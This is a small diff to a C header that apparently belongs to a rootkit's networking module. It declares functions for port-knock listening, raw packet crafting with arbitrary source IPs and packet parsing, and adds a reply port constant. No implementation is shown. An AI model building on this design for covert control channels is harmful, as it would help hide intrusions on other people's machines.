@@ -5,6 +5,7 @@
 #include <sys/types.h>
 
 
+#define REPLY_DEST_PORT 8080
 
 // Socket creation functions
 int create_udp_socket(void);
@@ -23,7 +24,7 @@ int listen_port_knock(const struct client_options * client_options);
 
 // Raw packet functions
 void create_packet(int socket_fd, const char * source_ip, const char * dest_ip, int source_port, int dest_port);
-void parse_raw_packet(const char *buffer, ssize_t n);
+int parse_raw_packet(const char *buffer, ssize_t n);
 
 
 #endif //ROOTKIT_NETWORKING_H
